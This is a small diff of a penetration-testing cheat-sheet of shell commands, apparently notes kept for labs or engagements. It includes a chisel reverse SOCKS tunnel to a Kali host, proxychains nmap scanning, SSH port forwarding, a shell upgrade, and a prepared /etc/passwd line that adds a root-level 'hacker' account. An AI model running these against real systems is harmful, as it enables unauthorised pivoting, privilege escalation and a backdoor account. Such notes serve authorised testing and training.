@@ -29,7 +29,7 @@ ls -la /etc/iptables/; cat /etc/iptables/*
 tcpdump -i tun0 icmp
 ./chisel_linux64 client kali-docker:9999 R:socks
 sudo proxychains nmap -v -sT -Pn --top-ports 1000 "$rhost"
-cssh -L 1234:127.0.0.1:5901 some_user@$rhost     # listen on port 1234 on kali and forward traffic to remote to 127.0.0.1 port 5901
+cssh -L 1234:127.0.0.1:5901 some_user@$rhost          # listen on port 1234 on kali and forward traffic to remote to 127.0.0.1 port 5901
 
 # user
 sudo -l
@@ -37,6 +37,6 @@ id; whoami; groups
 
 # helper
 openssl passwd -1 -salt ignite pass
-python -c 'import pty; pty.spawn("/bin/bash");' && export TERM=xterm
+python -c 'import pty; pty.spawn("/bin/bash");'       # in new bash run: export TERM=xterm
 passwd line (password=pass): hacker:$1$ignite$ecpCwhwORTaNyHu4pN9MD/:0:0:root:/root:/bin/bash
 sudo sed -i '/^socks4/ s/^/#/' /etc/proxychains.conf && echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains.conf
